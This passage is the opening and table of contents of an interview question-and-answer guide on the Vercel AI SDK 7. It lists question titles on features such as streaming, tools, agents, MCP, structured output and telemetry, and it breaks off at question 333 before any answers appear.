# Vercel AI SDK Interview Questions and Answers

_Last updated: November 11, 2026_

450 Vercel AI SDK interview questions with answers, split into three levels: 150 easy, 150 moderate and 150 advanced.

The answers target AI SDK 7 (the `ai` package, version 7.0.x, with `@ai-sdk/react` 4.x and `@ai-sdk/mcp` 2.x). AI SDK 7 renamed several options, for example `system` became `instructions`, `onFinish` became `onEnd` and `experimental_telemetry` became `telemetry`. The old names still work but are deprecated, so the answers use the new names and point out the old ones where you will still see them in existing code. Model IDs in the examples change often, so check the provider docs for current names.

## Table of Contents

- [Easy Questions (1-150)](#easy-questions-1-150)
- [Moderate Questions (151-300)](#moderate-questions-151-300)
- [Advanced Questions (301-450)](#advanced-questions-301-450)

### Easy Questions (1-150)

- [1: What is the Vercel AI SDK?](#1-what-is-the-vercel-ai-sdk)
- [2: Which npm package do you install to use the AI SDK?](#2-which-npm-package-do-you-install-to-use-the-ai-sdk)
- [3: What is a provider in the AI SDK?](#3-what-is-a-provider-in-the-ai-sdk)
- [4: How do you create a model instance with a provider package?](#4-how-do-you-create-a-model-instance-with-a-provider-package)
- [5: What does generateText do?](#5-what-does-generatetext-do)
- [6: What does streamText do?](#6-what-does-streamtext-do)
- [7: What is the difference between generateText and streamText?](#7-what-is-the-difference-between-generatetext-and-streamtext)
- [8: Is streamText an async function?](#8-is-streamtext-an-async-function)
- [9: What is the difference between prompt and messages?](#9-what-is-the-difference-between-prompt-and-messages)
- [10: What is the instructions option?](#10-what-is-the-instructions-option)
- [11: What message roles does the AI SDK support?](#11-what-message-roles-does-the-ai-sdk-support)
- [12: What is a ModelMessage?](#12-what-is-a-modelmessage)
- [13: What is a UIMessage?](#13-what-is-a-uimessage)
- [14: Why does the AI SDK have both UIMessage and ModelMessage?](#14-why-does-the-ai-sdk-have-both-uimessage-and-modelmessage)
- [15: What does the text property on the generateText result contain?](#15-what-does-the-text-property-on-the-generatetext-result-contain)
- [16: What is token usage and how do you read it?](#16-what-is-token-usage-and-how-do-you-read-it)
- [17: What is finishReason?](#17-what-is-finishreason)
- [18: How do you limit the length of the model's answer?](#18-how-do-you-limit-the-length-of-the-models-answer)
- [19: What does temperature control?](#19-what-does-temperature-control)
- [20: What other common generation settings does the AI SDK support?](#20-what-other-common-generation-settings-does-the-ai-sdk-support)
- [21: What is the Vercel AI Gateway?](#21-what-is-the-vercel-ai-gateway)
- [22: How do you call a model through the AI Gateway?](#22-how-do-you-call-a-model-through-the-ai-gateway)
- [23: When would you use a provider package instead of the AI Gateway?](#23-when-would-you-use-a-provider-package-instead-of-the-ai-gateway)
- [24: How do you set a custom API key or base URL for a provider?](#24-how-do-you-set-a-custom-api-key-or-base-url-for-a-provider)
- [25: What is AI SDK Core?](#25-what-is-ai-sdk-core)
- [26: What is AI SDK UI?](#26-what-is-ai-sdk-ui)
- [27: What does the useChat hook do?](#27-what-does-the-usechat-hook-do)
- [28: Does useChat manage the input field for you?](#28-does-usechat-manage-the-input-field-for-you)
- [29: What does a basic chat API route look like in Next.js?](#29-what-does-a-basic-chat-api-route-look-like-in-nextjs)
- [30: What does convertToModelMessages do?](#30-what-does-converttomodelmessages-do)
- [31: What are the status values of useChat?](#31-what-are-the-status-values-of-usechat)
- [32: How do you stop a streaming answer from the UI?](#32-how-do-you-stop-a-streaming-answer-from-the-ui)
- [33: How do you show errors in useChat?](#33-how-do-you-show-errors-in-usechat)
- [34: What does regenerate do in useChat?](#34-what-does-regenerate-do-in-usechat)
- [35: How do you change the API endpoint that useChat calls?](#35-how-do-you-change-the-api-endpoint-that-usechat-calls)
- [36: What is a chat transport?](#36-what-is-a-chat-transport)
- [37: What are message parts?](#37-what-are-message-parts)
- [38: Why did the SDK move from message content to message parts?](#38-why-did-the-sdk-move-from-message-content-to-message-parts)
- [39: What is a tool in the AI SDK?](#39-what-is-a-tool-in-the-ai-sdk)
- [40: How do you define a tool?](#40-how-do-you-define-a-tool)
- [41: What is inputSchema in a tool?](#41-what-is-inputschema-in-a-tool)
- [42: Why is the tool description important?](#42-why-is-the-tool-description-important)
- [43: What happens if a tool has no execute function?](#43-what-happens-if-a-tool-has-no-execute-function)
- [44: What is a step?](#44-what-is-a-step)
- [45: What is stopWhen?](#45-what-is-stopwhen)
- [46: What is the difference between isStepCount and stepCountIs?](#46-what-is-the-difference-between-isstepcount-and-stepcountis)
- [47: What replaced maxSteps?](#47-what-replaced-maxsteps)
- [48: What does hasToolCall do?](#48-what-does-hastoolcall-do)
- [49: What is structured output?](#49-what-is-structured-output)
- [50: How do you get a typed object from the model?](#50-how-do-you-get-a-typed-object-from-the-model)
- [51: What output types does the Output helper offer?](#51-what-output-types-does-the-output-helper-offer)
- [52: How do you classify text into one of a few labels?](#52-how-do-you-classify-text-into-one-of-a-few-labels)
- [53: How do you get a list of items from the model?](#53-how-do-you-get-a-list-of-items-from-the-model)
- [54: What happened to generateObject and streamObject?](#54-what-happened-to-generateobject-and-streamobject)
- [55: How do you stream a structured object to the user?](#55-how-do-you-stream-a-structured-object-to-the-user)
- [56: What is the useObject hook?](#56-what-is-the-useobject-hook)
- [57: What is the useCompletion hook?](#57-what-is-the-usecompletion-hook)
- [58: What is an embedding?](#58-what-is-an-embedding)
- [59: How do you create an embedding for one piece of text?](#59-how-do-you-create-an-embedding-for-one-piece-of-text)
- [60: How do you embed many texts at once?](#60-how-do-you-embed-many-texts-at-once)
- [61: How do you compare two embeddings?](#61-how-do-you-compare-two-embeddings)
- [62: What does rerank do?](#62-what-does-rerank-do)
- [63: How do you generate an image with the AI SDK?](#63-how-do-you-generate-an-image-with-the-ai-sdk)
- [64: How do you turn text into speech?](#64-how-do-you-turn-text-into-speech)
- [65: How do you turn audio into text?](#65-how-do-you-turn-audio-into-text)
- [66: How do you send an image to a model?](#66-how-do-you-send-an-image-to-a-model)
- [67: How do you send a PDF to a model?](#67-how-do-you-send-a-pdf-to-a-model)
- [68: How do you send files from useChat?](#68-how-do-you-send-files-from-usechat)
- [69: What are providerOptions?](#69-what-are-provideroptions)
- [70: What is the reasoning option?](#70-what-is-the-reasoning-option)
- [71: How do you read the model's reasoning?](#71-how-do-you-read-the-models-reasoning)
- [72: What are sources?](#72-what-are-sources)
- [73: How do you cancel a model call on the server?](#73-how-do-you-cancel-a-model-call-on-the-server)
- [74: How do you set a timeout for a model call?](#74-how-do-you-set-a-timeout-for-a-model-call)
- [75: Does the AI SDK retry failed requests?](#75-does-the-ai-sdk-retry-failed-requests)
- [76: What is APICallError?](#76-what-is-apicallerror)
- [77: How does error handling differ in streamText?](#77-how-does-error-handling-differ-in-streamtext)
- [78: What is the onEnd callback?](#78-what-is-the-onend-callback)
- [79: What is the onStepEnd callback?](#79-what-is-the-onstepend-callback)
- [80: What is the onChunk callback?](#80-what-is-the-onchunk-callback)
- [81: What is the difference between textStream and stream?](#81-what-is-the-difference-between-textstream-and-stream)
- [82: What is toolChoice?](#82-what-is-toolchoice)
- [83: What is activeTools?](#83-what-is-activetools)
- [84: What are tool results and how does the model get them?](#84-what-are-tool-results-and-how-does-the-model-get-them)
- [85: How do you show tool calls in the chat UI?](#85-how-do-you-show-tool-calls-in-the-chat-ui)
- [86: What is a dynamic tool?](#86-what-is-a-dynamic-tool)
- [87: What is MCP and how does the AI SDK support it?](#87-what-is-mcp-and-how-does-the-ai-sdk-support-it)
- [88: What is an agent in the AI SDK?](#88-what-is-an-agent-in-the-ai-sdk)
- [89: How do you create a ToolLoopAgent?](#89-how-do-you-create-a-toolloopagent)
- [90: What is the default stop condition of ToolLoopAgent?](#90-what-is-the-default-stop-condition-of-toolloopagent)
- [91: What did ToolLoopAgent replace?](#91-what-did-toolloopagent-replace)
- [92: What is middleware in the AI SDK?](#92-what-is-middleware-in-the-ai-sdk)
- [93: What built-in middleware does the AI SDK provide?](#93-what-built-in-middleware-does-the-ai-sdk-provide)
- [94: What is a provider registry?](#94-what-is-a-provider-registry)
- [95: What is customProvider used for?](#95-what-is-customprovider-used-for)
- [96: Which Node.js version does AI SDK 7 need?](#96-which-nodejs-version-does-ai-sdk-7-need)
- [97: How do you upgrade an older project to a new major version?](#97-how-do-you-upgrade-an-older-project-to-a-new-major-version)
- [98: What is AI SDK RSC and should you use it?](#98-what-is-ai-sdk-rsc-and-should-you-use-it)
- [99: What does smoothStream do?](#99-what-does-smoothstream-do)
- [100: How do you write unit tests without calling a real model?](#100-how-do-you-write-unit-tests-without-calling-a-real-model)
- [101: Which frameworks can you use the AI SDK with?](#101-which-frameworks-can-you-use-the-ai-sdk-with)
- [102: How do you return a chat stream from an Express server?](#102-how-do-you-return-a-chat-stream-from-an-express-server)
- [103: How do you return plain text instead of a UI message stream?](#103-how-do-you-return-plain-text-instead-of-a-ui-message-stream)
- [104: Why should you call models from the server and not the browser?](#104-why-should-you-call-models-from-the-server-and-not-the-browser)
- [105: How does the SDK find the API key?](#105-how-does-the-sdk-find-the-api-key)
- [106: What can you pass to sendMessage?](#106-what-can-you-pass-to-sendmessage)
- [107: How do you load an existing conversation into useChat?](#107-how-do-you-load-an-existing-conversation-into-usechat)
- [108: What does the id option of useChat do?](#108-what-does-the-id-option-of-usechat-do)
- [109: What does setMessages do?](#109-what-does-setmessages-do)
- [110: What is message metadata?](#110-what-is-message-metadata)
- [111: What does onFinish do in useChat?](#111-what-does-onfinish-do-in-usechat)
- [112: What is onToolCall in useChat?](#112-what-is-ontoolcall-in-usechat)
- [113: What does addToolOutput do?](#113-what-does-addtooloutput-do)
- [114: How do you send the conversation again after a client tool finishes?](#114-how-do-you-send-the-conversation-again-after-a-client-tool-finishes)
- [115: What does the throttle option of useChat do?](#115-what-does-the-throttle-option-of-usechat-do)
- [116: How does the server send data to useChat?](#116-how-does-the-server-send-data-to-usechat)
- [117: What are data parts?](#117-what-are-data-parts)
- [118: How do you help the model fill tool arguments correctly?](#118-how-do-you-help-the-model-fill-tool-arguments-correctly)
- [119: How do you use a plain JSON Schema instead of Zod?](#119-how-do-you-use-a-plain-json-schema-instead-of-zod)
- [120: Can you use schema libraries other than Zod?](#120-can-you-use-schema-libraries-other-than-zod)
- [121: What is outputSchema on a tool?](#121-what-is-outputschema-on-a-tool)
- [122: What does a tool's execute function receive?](#122-what-does-a-tools-execute-function-receive)
- [123: What happens when a tool's execute function throws?](#123-what-happens-when-a-tools-execute-function-throws)
- [124: What is NoSuchToolError?](#124-what-is-nosuchtoolerror)
- [125: What is InvalidToolInputError?](#125-what-is-invalidtoolinputerror)
- [126: What is NoOutputGeneratedError?](#126-what-is-nooutputgeneratederror)
- [127: What is in result.steps?](#127-what-is-in-resultsteps)
- [128: What is result.responseMessages?](#128-what-is-resultresponsemessages)
- [129: What is result.finalStep?](#129-what-is-resultfinalstep)
- [130: What are warnings on the result?](#130-what-are-warnings-on-the-result)
- [131: How do you send custom HTTP headers to the provider?](#131-how-do-you-send-custom-http-headers-to-the-provider)
- [132: When would you use Output.json?](#132-when-would-you-use-outputjson)
- [133: What happens if you use a feature a model does not support?](#133-what-happens-if-you-use-a-feature-a-model-does-not-support)
- [134: What can you pass as the model option?](#134-what-can-you-pass-as-the-model-option)
- [135: How do you use a model that has an OpenAI-compatible API?](#135-how-do-you-use-a-model-that-has-an-openai-compatible-api)
- [136: What official providers does the AI SDK have?](#136-what-official-providers-does-the-ai-sdk-have)
- [137: Which OpenAI API does openai(modelId) use?](#137-which-openai-api-does-openaimodelid-use)
- [138: What are provider-defined tools?](#138-what-are-provider-defined-tools)
- [139: What does isLoopFinished do?](#139-what-does-isloopfinished-do)
- [140: What does pruneMessages do?](#140-what-does-prunemessages-do)
- [141: What is AI Elements?](#141-what-is-ai-elements)
- [142: How do you render markdown in streamed answers?](#142-how-do-you-render-markdown-in-streamed-answers)
- [143: What do generateId and createIdGenerator do?](#143-what-do-generateid-and-createidgenerator-do)
- [144: What is the Chat class in @ai-sdk/react?](#144-what-is-the-chat-class-in-ai-sdkreact)
- [145: How do you get the full text from streamText without reading the stream?](#145-how-do-you-get-the-full-text-from-streamtext-without-reading-the-stream)
- [146: What does consumeStream do?](#146-what-does-consumestream-do)
- [147: What is DirectChatTransport?](#147-what-is-directchattransport)
- [148: What is TextStreamChatTransport?](#148-what-is-textstreamchattransport)
- [149: Why use the AI SDK instead of a provider's own SDK?](#149-why-use-the-ai-sdk-instead-of-a-providers-own-sdk)
- [150: What is AI SDK DevTools?](#150-what-is-ai-sdk-devtools)

### Moderate Questions (151-300)

- [151: How do you save chat messages on the server after each answer?](#151-how-do-you-save-chat-messages-on-the-server-after-each-answer)
- [152: How do you send only the last message from the client instead of the whole history?](#152-how-do-you-send-only-the-last-message-from-the-client-instead-of-the-whole-history)
- [153: Why should you validate UI messages that come from the client?](#153-why-should-you-validate-ui-messages-that-come-from-the-client)
- [154: How do you stream custom data alongside the model answer?](#154-how-do-you-stream-custom-data-alongside-the-model-answer)
- [155: How do you update a data part instead of adding a new one?](#155-how-do-you-update-a-data-part-instead-of-adding-a-new-one)
- [156: What are transient data parts?](#156-what-are-transient-data-parts)
- [157: How do you get type safety for data parts and metadata on the client?](#157-how-do-you-get-type-safety-for-data-parts-and-metadata-on-the-client)
- [158: How do you add metadata like token usage to the assistant message?](#158-how-do-you-add-metadata-like-token-usage-to-the-assistant-message)
- [159: How do you type tool parts in the UI?](#159-how-do-you-type-tool-parts-in-the-ui)
- [160: How do you add authentication headers to useChat requests?](#160-how-do-you-add-authentication-headers-to-usechat-requests)
- [161: How do you send extra fields like the selected model to the server?](#161-how-do-you-send-extra-fields-like-the-selected-model-to-the-server)
- [162: How does tool approval work in AI SDK 7?](#162-how-does-tool-approval-work-in-ai-sdk-7)
- [163: How does the user approve a tool call in the UI?](#163-how-does-the-user-approve-a-tool-call-in-the-ui)
- [164: What was needsApproval and why was it deprecated?](#164-what-was-needsapproval-and-why-was-it-deprecated)
- [165: How do you decide approval based on the tool's input?](#165-how-do-you-decide-approval-based-on-the-tools-input)
- [166: What is prepareStep?](#166-what-is-preparestep)
- [167: How can prepareStep cut costs in an agent?](#167-how-can-preparestep-cut-costs-in-an-agent)
- [168: How do you write a custom stop condition?](#168-how-do-you-write-a-custom-stop-condition)
- [169: How do you combine tools and structured output in one call?](#169-how-do-you-combine-tools-and-structured-output-in-one-call)
- [170: What is repairToolCall?](#170-what-is-repairtoolcall)
- [171: What is toModelOutput on a tool?](#171-what-is-tomodeloutput-on-a-tool)
- [172: Why should you pass tools to convertToModelMessages?](#172-why-should-you-pass-tools-to-converttomodelmessages)
- [173: What is runtimeContext?](#173-what-is-runtimecontext)
- [174: How do tools get context like the current user?](#174-how-do-tools-get-context-like-the-current-user)
- [175: What lifecycle callbacks do generateText and streamText have in AI SDK 7?](#175-what-lifecycle-callbacks-do-generatetext-and-streamtext-have-in-ai-sdk-7)
- [176: How do you log the time each tool takes?](#176-how-do-you-log-the-time-each-tool-takes)
- [177: How do you use the agent from a Next.js route?](#177-how-do-you-use-the-agent-from-a-nextjs-route)
- [178: When should you use ToolLoopAgent instead of calling generateText directly?](#178-when-should-you-use-toolloopagent-instead-of-calling-generatetext-directly)
- [179: What are call options on a ToolLoopAgent?](#179-what-are-call-options-on-a-toolloopagent)
- [180: How do you use MCP tools with generateText?](#180-how-do-you-use-mcp-tools-with-generatetext)
- [181: What MCP transports does the AI SDK client support?](#181-what-mcp-transports-does-the-ai-sdk-client-support)
- [182: How do you get typed MCP tools?](#182-how-do-you-get-typed-mcp-tools)
- [183: How do you write language model middleware?](#183-how-do-you-write-language-model-middleware)
- [184: How do you apply several middlewares to one model?](#184-how-do-you-apply-several-middlewares-to-one-model)
- [185: How do you use extractReasoningMiddleware?](#185-how-do-you-use-extractreasoningmiddleware)
- [186: How do you set up OpenTelemetry tracing in AI SDK 7?](#186-how-do-you-set-up-opentelemetry-tracing-in-ai-sdk-7)
- [187: Why would you set recordInputs or recordOutputs to false?](#187-why-would-you-set-recordinputs-or-recordoutputs-to-false)
- [188: What is functionId in telemetry?](#188-what-is-functionid-in-telemetry)
- [189: How do you handle rate limit errors?](#189-how-do-you-handle-rate-limit-errors)
- [190: How do you add a fallback model when a provider is down?](#190-how-do-you-add-a-fallback-model-when-a-provider-is-down)
- [191: How do you limit which providers the AI Gateway uses?](#191-how-do-you-limit-which-providers-the-ai-gateway-uses)
- [192: How do you use prompt caching with Anthropic?](#192-how-do-you-use-prompt-caching-with-anthropic)
- [193: How do you read cached and reasoning token counts?](#193-how-do-you-read-cached-and-reasoning-token-counts)
- [194: How do you resume a stream after the user refreshes the page?](#194-how-do-you-resume-a-stream-after-the-user-refreshes-the-page)
- [195: What is the catch with resume and stop?](#195-what-is-the-catch-with-resume-and-stop)
- [196: How do you build a chat that lets the user pick the model?](#196-how-do-you-build-a-chat-that-lets-the-user-pick-the-model)
- [197: How do you show the reasoning in the chat UI?](#197-how-do-you-show-the-reasoning-in-the-chat-ui)
- [198: How do you show sources in the chat UI?](#198-how-do-you-show-sources-in-the-chat-ui)
- [199: How do you return errors to the client with more detail?](#199-how-do-you-return-errors-to-the-client-with-more-detail)
- [200: How do you share chat state between two components?](#200-how-do-you-share-chat-state-between-two-components)
- [201: How do you build simple RAG with the AI SDK?](#201-how-do-you-build-simple-rag-with-the-ai-sdk)
- [202: What is the difference between classic RAG and RAG as a tool?](#202-what-is-the-difference-between-classic-rag-and-rag-as-a-tool)
- [203: Does the AI SDK split documents into chunks for you?](#203-does-the-ai-sdk-split-documents-into-chunks-for-you)
- [204: How do you store and search embeddings in Postgres?](#204-how-do-you-store-and-search-embeddings-in-postgres)
- [205: What does the dimensions option in embed do?](#205-what-does-the-dimensions-option-in-embed-do)
- [206: What does maxParallelCalls do in embedMany?](#206-what-does-maxparallelcalls-do-in-embedmany)
- [207: Can you add middleware to embedding models?](#207-can-you-add-middleware-to-embedding-models)
- [208: How do you edit an image with generateImage?](#208-how-do-you-edit-an-image-with-generateimage)
- [209: How do n and maxImagesPerCall work in generateImage?](#209-how-do-n-and-maximagespercall-work-in-generateimage)
- [210: How do you get images from a language model like Gemini?](#210-how-do-you-get-images-from-a-language-model-like-gemini)
- [211: How do you show a tool call while the model is still writing its arguments?](#211-how-do-you-show-a-tool-call-while-the-model-is-still-writing-its-arguments)
- [212: How does a tool send progress updates before its final result?](#212-how-does-a-tool-send-progress-updates-before-its-final-result)
- [213: How do you test code that uses streamText?](#213-how-do-you-test-code-that-uses-streamtext)
- [214: How do you test a tool on its own?](#214-how-do-you-test-a-tool-on-its-own)
- [215: How do you test the quality of model answers?](#215-how-do-you-test-the-quality-of-model-answers)
- [216: How do you deal with long conversations that grow past the context window?](#216-how-do-you-deal-with-long-conversations-that-grow-past-the-context-window)
- [217: How would you summarize old messages to save tokens?](#217-how-would-you-summarize-old-messages-to-save-tokens)
- [218: How do you give an agent different tools at different stages?](#218-how-do-you-give-an-agent-different-tools-at-different-stages)
- [219: Does the SDK run several tool calls from one step in parallel?](#219-does-the-sdk-run-several-tool-calls-from-one-step-in-parallel)
- [220: How do you build a sub-agent?](#220-how-do-you-build-a-sub-agent)
- [221: How do you stop generation on the server when the client disconnects?](#221-how-do-you-stop-generation-on-the-server-when-the-client-disconnects)
- [222: How do you save a partial answer when the user clicks stop?](#222-how-do-you-save-a-partial-answer-when-the-user-clicks-stop)
- [223: How do you rate-limit a chat endpoint?](#223-how-do-you-rate-limit-a-chat-endpoint)
- [224: Can you call generateText from a Next.js Server Action?](#224-can-you-call-generatetext-from-a-nextjs-server-action)
- [225: Why do some chat routes set maxDuration?](#225-why-do-some-chat-routes-set-maxduration)
- [226: Why might streaming not work behind a proxy?](#226-why-might-streaming-not-work-behind-a-proxy)
- [227: How do you use useChat in Vue?](#227-how-do-you-use-usechat-in-vue)
- [228: How do you use the AI SDK in Svelte?](#228-how-do-you-use-the-ai-sdk-in-svelte)
- [229: How do you use the AI SDK in Angular?](#229-how-do-you-use-the-ai-sdk-in-angular)
- [230: Should you save UIMessages or ModelMessages?](#230-should-you-save-uimessages-or-modelmessages)
- [231: What problem can happen with saved messages when you change a tool?](#231-what-problem-can-happen-with-saved-messages-when-you-change-a-tool)
- [232: How do you stream data from inside a tool to the UI?](#232-how-do-you-stream-data-from-inside-a-tool-to-the-ui)
- [233: What does providerExecuted mean on a tool part?](#233-what-does-providerexecuted-mean-on-a-tool-part)
- [234: What tools does the Anthropic provider offer?](#234-what-tools-does-the-anthropic-provider-offer)
- [235: How do you give an object output a name and description?](#235-how-do-you-give-an-object-output-a-name-and-description)
- [236: What should you watch for when writing schemas for structured output?](#236-what-should-you-watch-for-when-writing-schemas-for-structured-output)
- [237: What does strict on a tool do?](#237-what-does-strict-on-a-tool-do)
- [238: What is elementStream?](#238-what-is-elementstream)
- [239: How does useObject get its data from the server?](#239-how-does-useobject-get-its-data-from-the-server)
- [240: What does the include option do?](#240-what-does-the-include-option-do)
- [241: What is providerMetadata?](#241-what-is-providermetadata)
- [242: How do you continue a conversation using OpenAI's stored responses?](#242-how-do-you-continue-a-conversation-using-openais-stored-responses)
- [243: How do you handle a model that returns its JSON inside markdown code fences?](#243-how-do-you-handle-a-model-that-returns-its-json-inside-markdown-code-fences)
- [244: How do you make a model without native streaming work with streamText?](#244-how-do-you-make-a-model-without-native-streaming-work-with-streamtext)
- [245: How do you cache model responses?](#245-how-do-you-cache-model-responses)
- [246: How do you add guardrails with middleware?](#246-how-do-you-add-guardrails-with-middleware)
- [247: How do you see the exact request sent to the provider?](#247-how-do-you-see-the-exact-request-sent-to-the-provider)
- [248: What are the per-call telemetry options?](#248-what-are-the-per-call-telemetry-options)
- [249: How do you use a different provider per environment?](#249-how-do-you-use-a-different-provider-per-environment)
- [250: How do you count tokens before sending a request?](#250-how-do-you-count-tokens-before-sending-a-request)
- [251: What is tool search in AI SDK 7?](#251-what-is-tool-search-in-ai-sdk-7)
- [252: Can you use your own search logic with toolSearch?](#252-can-you-use-your-own-search-logic-with-toolsearch)
- [253: How do you set different timeouts for different tools?](#253-how-do-you-set-different-timeouts-for-different-tools)
- [254: What is streamRetries in streamText?](#254-what-is-streamretries-in-streamtext)
- [255: What is onStepError?](#255-what-is-onsteperror)
- [256: Why does AI SDK 7 reject system messages inside messages?](#256-why-does-ai-sdk-7-reject-system-messages-inside-messages)
- [257: What can you pass as instructions?](#257-what-can-you-pass-as-instructions)
- [258: How do you get structured output from a ToolLoopAgent?](#258-how-do-you-get-structured-output-from-a-toolloopagent)
- [259: How do you stream from a ToolLoopAgent yourself?](#259-how-do-you-stream-from-a-toolloopagent-yourself)
- [260: How do you build a simple terminal chatbot with the AI SDK?](#260-how-do-you-build-a-simple-terminal-chatbot-with-the-ai-sdk)
- [261: How do you turn a FileList into message parts yourself?](#261-how-do-you-turn-a-filelist-into-message-parts-yourself)
- [262: What is uploadFile used for?](#262-what-is-uploadfile-used-for)
- [263: How do you set a thinking budget for a specific provider?](#263-how-do-you-set-a-thinking-budget-for-a-specific-provider)
- [264: What changed in the Google provider in AI SDK 7?](#264-what-changed-in-the-google-provider-in-ai-sdk-7)
- [265: How do you use Amazon Bedrock or Azure OpenAI?](#265-how-do-you-use-amazon-bedrock-or-azure-openai)
- [266: How does the AI Gateway authenticate on Vercel?](#266-how-does-the-ai-gateway-authenticate-on-vercel)
- [267: How do you change the default provider for string model IDs?](#267-how-do-you-change-the-default-provider-for-string-model-ids)
- [268: How do you turn off or redirect warning logs?](#268-how-do-you-turn-off-or-redirect-warning-logs)
- [269: What does onData do in useChat?](#269-what-does-ondata-do-in-usechat)
- [270: How do you edit a user message and get a new answer?](#270-how-do-you-edit-a-user-message-and-get-a-new-answer)
- [271: What is clearError for?](#271-what-is-clearerror-for)
- [272: What is generative UI?](#272-what-is-generative-ui)
- [273: How is generative UI with useChat different from AI SDK RSC?](#273-how-is-generative-ui-with-usechat-different-from-ai-sdk-rsc)
- [274: When do you use a client-side tool and when do you use tool approval?](#274-when-do-you-use-a-client-side-tool-and-when-do-you-use-tool-approval)
- [275: How do you render dynamic tools like MCP tools in the UI?](#275-how-do-you-render-dynamic-tools-like-mcp-tools-in-the-ui)
- [276: What do isToolUIPart and getToolName do?](#276-what-do-istooluipart-and-gettoolname-do)
- [277: What does readUIMessageStream do?](#277-what-does-readuimessagestream-do)
- [278: How can a sub-agent show its progress in the main chat?](#278-how-can-a-sub-agent-show-its-progress-in-the-main-chat)
- [279: What else can the MCP client do besides tools?](#279-what-else-can-the-mcp-client-do-besides-tools)
- [280: How do you connect to an MCP server that needs OAuth?](#280-how-do-you-connect-to-an-mcp-server-that-needs-oauth)
- [281: How should you handle MCP clients in serverless functions?](#281-how-should-you-handle-mcp-clients-in-serverless-functions)
- [282: Does the AI SDK help you build an MCP server?](#282-does-the-ai-sdk-help-you-build-an-mcp-server)
- [283: What options does transcribe offer?](#283-what-options-does-transcribe-offer)
- [284: How do you choose the audio format in generateSpeech?](#284-how-do-you-choose-the-audio-format-in-generatespeech)
- [285: Can the AI SDK generate video?](#285-can-the-ai-sdk-generate-video)
- [286: What is the batch API in the AI SDK?](#286-what-is-the-batch-api-in-the-ai-sdk)
- [287: How do you add middleware to image models or to a whole provider?](#287-how-do-you-add-middleware-to-image-models-or-to-a-whole-provider)
- [288: Can you use a provider package written for an older spec version?](#288-can-you-use-a-provider-package-written-for-an-older-spec-version)
- [289: How do you get the model's answer and its tool calls as one ordered list?](#289-how-do-you-get-the-models-answer-and-its-tool-calls-as-one-ordered-list)
- [290: What is the difference between staticToolCalls and dynamicToolCalls?](#290-what-is-the-difference-between-statictoolcalls-and-dynamictoolcalls)
- [291: How do you handle the stream parts yourself in streamText?](#291-how-do-you-handle-the-stream-parts-yourself-in-streamtext)
- [292: What are the start-step and finish-step stream parts?](#292-what-are-the-start-step-and-finish-step-stream-parts)
- [293: Why should tool results be small?](#293-why-should-tool-results-be-small)
- [294: How do you pass a user's timezone or locale to the model?](#294-how-do-you-pass-a-users-timezone-or-locale-to-the-model)
- [295: How do you add a "new chat" button with useChat?](#295-how-do-you-add-a-new-chat-button-with-usechat)
- [296: What is the common cause of "messages do not match" errors after adding tools?](#296-what-is-the-common-cause-of-messages-do-not-match-errors-after-adding-tools)
- [297: Why should you use await with convertToModelMessages in AI SDK 7?](#297-why-should-you-use-await-with-converttomodelmessages-in-ai-sdk-7)
- [298: How do you write an agent that remembers things across chats?](#298-how-do-you-write-an-agent-that-remembers-things-across-chats)
- [299: How do you make sure an agent ends with a final answer and not a tool call?](#299-how-do-you-make-sure-an-agent-ends-with-a-final-answer-and-not-a-tool-call)
- [300: What is the difference between the AI SDK and LangChain.js?](#300-what-is-the-difference-between-the-ai-sdk-and-langchainjs)

### Advanced Questions (301-450)

- [301: Walk through what happens inside one generateText call with tools.](#301-walk-through-what-happens-inside-one-generatetext-call-with-tools)
- [302: What is the LanguageModelV4 specification?](#302-what-is-the-languagemodelv4-specification)
- [303: How would you write a custom provider for an internal model API?](#303-how-would-you-write-a-custom-provider-for-an-internal-model-api)
- [304: What is supportedUrls on a model?](#304-what-is-supportedurls-on-a-model)
- [305: Why are providers separate packages?](#305-why-are-providers-separate-packages)
- [306: What happens in memory when you read several streams from one streamText result?](#306-what-happens-in-memory-when-you-read-several-streams-from-one-streamtext-result)
- [307: Why do promise fields like result.text not resolve sometimes?](#307-why-do-promise-fields-like-resulttext-not-resolve-sometimes)
- [308: How do text-start, text-delta and text-end work in the stream protocol?](#308-how-do-text-start-text-delta-and-text-end-work-in-the-stream-protocol)
- [309: How does useChat build a message from stream chunks?](#309-how-does-usechat-build-a-message-from-stream-chunks)
- [310: How is structured output implemented under the hood?](#310-how-is-structured-output-implemented-under-the-hood)
- [311: Why are partial outputs not validated against the schema?](#311-why-are-partial-outputs-not-validated-against-the-schema)
- [312: How does token cost grow in a multi-step agent loop?](#312-how-does-token-cost-grow-in-a-multi-step-agent-loop)
- [313: How do you keep prompts cache-friendly in an agent?](#313-how-do-you-keep-prompts-cache-friendly-in-an-agent)
- [314: What is code mode?](#314-what-is-code-mode)
- [315: What is experimental_toolCallers?](#315-what-is-experimental_toolcallers)
- [316: How can a client forge a tool approval, and how does AI SDK 7 prevent it?](#316-how-can-a-client-forge-a-tool-approval-and-how-does-ai-sdk-7-prevent-it)
- [317: What is indirect prompt injection and how does it affect agents?](#317-what-is-indirect-prompt-injection-and-how-does-it-affect-agents)
- [318: How can a chat UI leak data through markdown?](#318-how-can-a-chat-ui-leak-data-through-markdown)
- [319: Why use toolsContext instead of letting the model pass the user ID?](#319-why-use-toolscontext-instead-of-letting-the-model-pass-the-user-id)
- [320: What can go wrong if you trust tool outputs sent by the client?](#320-what-can-go-wrong-if-you-trust-tool-outputs-sent-by-the-client)
- [321: How do you protect against runaway costs from one user?](#321-how-do-you-protect-against-runaway-costs-from-one-user)
- [322: How do you use different API keys for different customers?](#322-how-do-you-use-different-api-keys-for-different-customers)
- [323: What is WorkflowAgent and when do you need it?](#323-what-is-workflowagent-and-when-do-you-need-it)
- [324: What is a harness in AI SDK 7?](#324-what-is-a-harness-in-ai-sdk-7)
- [325: When would you pick a harness over a ToolLoopAgent?](#325-when-would-you-pick-a-harness-over-a-toolloopagent)
- [326: What is a sandbox session in the AI SDK?](#326-what-is-a-sandbox-session-in-the-ai-sdk)
- [327: What is steering?](#327-what-is-steering)
- [328: What is experimental_decide?](#328-what-is-experimental_decide)
- [329: What is MCP Apps support?](#329-what-is-mcp-apps-support)
- [330: How does telemetry work internally in AI SDK 7?](#330-how-does-telemetry-work-internally-in-ai-sdk-7)
- [331: What spans does the OpenTelemetry integration create for a call with tools?](#331-what-spans-does-the-opentelemetry-integration-create-for-a-call-with-tools)
- [332: How does the SDK retry failed calls?](#332-how-does-the-sdk-retry-failed-calls)
- [333: How do the different timeout settings interact?](#333-how-do-the-different-timeout-settings-interact)
